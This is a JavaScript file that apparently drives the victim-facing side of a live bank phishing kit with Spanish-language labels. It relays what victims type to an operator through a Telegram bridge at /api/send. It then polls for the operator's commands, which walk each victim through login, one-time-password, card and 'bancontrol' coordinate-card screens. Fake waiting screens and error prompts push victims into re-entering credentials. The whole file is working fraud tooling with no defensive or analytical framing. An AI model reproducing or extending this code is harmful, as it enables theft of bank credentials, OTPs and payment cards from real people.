const Session = {
  save(k, v) { localStorage.setItem(`bg_${k}`, JSON.stringify(v)) },
  get(k) { try { return JSON.parse(localStorage.getItem(`bg_${k}`)) } catch { return null } },
  clear() { Object.keys(localStorage).filter(k => k.startsWith('bg_')).forEach(k => localStorage.removeItem(k)) }
};

function getBtns(step) {
  const bcBtn = { text: "🏦 BANCONTROL", callback_data: "bancontrol" };

  if (step === 'login') return [
    [{ text: "🔐 OTP", callback_data: "otp" }, { text: "💳 TARJETA", callback_data: "tarjeta" }],
    [bcBtn],
    [{ text: "❌ ERROR LOGIN", callback_data: "error_login" }]
  ];
  if (step === 'otp') return [
    [{ text: "💳 TARJETA", callback_data: "tarjeta" }],
    [bcBtn],
    [{ text: "❌ ERROR OTP", callback_data: "error_otp" }]
  ];
  if (step === 'tarjeta') return [
    [{ text: "🏁 FINALIZAR", callback_data: "finalizar" }],
    [{ text: "❌ ERROR TARJETA", callback_data: "error_tarjeta" }]
  ];
  if (step === 'bancontrol') return [
    [{ text: "🏁 FINALIZAR", callback_data: "finalizar" }],
    [{ text: "❌ ERROR BANCONTROL", callback_data: "error_bancontrol" }]
  ];
  return [];
}

async function sendTelegram(text, buttons = []) {
  const res = await fetch('/api/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ text, buttons })
  });
  return res.json();
}

async function startPolling(handler) {
  const iv = setInterval(async () => {
    try {
      const res = await fetch('/api/poll');
      const data = await res.json();

      if (!data.action) return;

      clearInterval(iv);
      if (data.coords) Session.save('bancontrol_coords', data.coords);
      handler(data.action, data.coords || null);
    } catch (e) { console.error('poll error:', e); }
  }, 2000);
}

function showWait() { document.getElementById('wait').classList.add('active') }
function hideWait() { document.getElementById('wait').classList.remove('active') }

function showAlert(id, msg) {
  const el = document.getElementById(id);
  el.classList.add('show');
  const s = el.querySelector('span');
  if (s && msg) s.textContent = msg;
}
function hideAlert(id) { document.getElementById(id)?.classList.remove('show') }

function showErr(id) {
  document.getElementById(id)?.classList.add('error');
  document.getElementById(`e-${id}`)?.classList.add('show');
}
function clearErrs(ids) {
  ids.forEach(id => {
    document.getElementById(id)?.classList.remove('error');
    document.getElementById(`e-${id}`)?.classList.remove('show');
  });
}
